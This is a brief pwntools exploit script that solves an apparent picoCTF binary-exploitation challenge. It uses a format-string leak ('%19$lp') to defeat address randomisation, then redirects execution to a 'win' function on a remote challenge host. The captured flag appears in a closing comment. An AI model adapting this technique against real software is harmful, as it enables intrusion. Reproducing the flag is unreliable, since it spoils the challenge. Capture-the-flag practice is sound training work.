#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec = False)

# con = process()
# gdb.attach(con, gdbscript = "b*call_functions+0x50")
con = remote("rescued-float.picoctf.net", 60306)

# Stage 1: format string leak addr
input()
con.sendlineafter(b"Enter your name:", b"%19$lp")
ret_leak = int(con.recvline().strip(b"\n"), 16)
elf.address = ret_leak - 0x1441

success(hex(ret_leak))
success(hex(elf.address))

# Stage 2: win
con.sendline(hex(elf.sym['win']))

con.interactive()

# picoCTF{p13_5h0u1dn'7_134k_e7fc8501}
